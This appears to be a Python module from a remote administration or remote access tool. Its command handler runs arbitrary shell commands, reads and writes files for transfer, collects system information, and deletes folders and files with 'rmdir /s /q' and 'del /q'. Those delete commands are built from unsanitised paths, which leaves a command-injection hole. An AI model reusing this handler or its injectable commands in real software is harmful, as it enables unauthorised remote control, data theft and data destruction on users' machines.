import subprocess
import os
from system_info import UserSystem


class Commands:
    def __init__(self):
        self.info = UserSystem()

    @staticmethod
    def change_dir(path):
        try:
            os.chdir(path)
            return os.getcwd()
        except FileNotFoundError:
            return "ERROR"

    @staticmethod
    def command(command):
        process = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        errors = process.stderr.read()
        answer = process.stdout.read()
        if errors:
            return errors.decode('cp866')
        if answer:
            return answer.decode('cp866')
        else:
            return 'OK'

    @staticmethod
    def send_file(file: str):
        try:
            with open(file, 'rb') as document:
                res = document.read()
            return res
        except FileNotFoundError:
            return "ERROR"

    @staticmethod
    def write_file(file):
        separator = '=' * 50
        separator = separator.encode()
        try:
            filename, file = file.split(separator)[0], file.split(separator)[1]
            with open(filename, 'wb') as doc:
                doc.write(file)
            return "OK"
        except:
            return "ERROR"

    def remove_dir(self, path):
        command = f'rmdir /s /q {path}'
        return self.command(command)

    def del_file(self, file):
        command = f'del /q {file}'
        return self.command(command)

    def sys_info(self):
        return str(self.info)

    def get_pc_name(self):
        return self.info.name
